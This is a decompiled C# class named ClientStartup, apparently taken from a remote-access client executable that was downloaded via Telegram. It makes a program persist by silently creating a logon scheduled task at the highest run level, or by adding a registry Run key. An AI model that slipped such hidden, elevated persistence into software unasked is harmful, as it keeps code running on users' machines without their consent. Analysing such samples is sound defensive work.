// Decompiled with JetBrains decompiler
// Type: InvokedClient.Setup.ClientStartup
// Assembly: Client, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79DD3210-3359-47C5-932E-9352F2CB8134
// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\client.exe

using InvokedClient.Helper;
using InvokedCommon.Enums;
using Microsoft.Win32;
using System.Diagnostics;


namespace InvokedClient.Setup
{
	public class ClientStartup : ClientSetupBase
	{
		public void AddToStartup(string executablePath, string startupName)
		{
			if (this.UserAccount.Type == AccountType.Admin)
			{
				Process process = Process.Start(new ProcessStartInfo("schtasks")
				{
					Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath + "\" /rl HIGHEST /f",
					UseShellExecute = false,
					CreateNoWindow = true
				});
				process.WaitForExit(1000);
				if (process.ExitCode == 0)
					return;
			}
			RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
		}

		public void RemoveFromStartup(string startupName)
		{
			if (this.UserAccount.Type == AccountType.Admin)
			{
				Process process = Process.Start(new ProcessStartInfo("schtasks")
				{
					Arguments = "/delete /tn \"" + startupName + "\" /f",
					UseShellExecute = false,
					CreateNoWindow = true
				});
				process.WaitForExit(1000);
				if (process.ExitCode == 0)
					return;
			}
			RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
		}
	}
}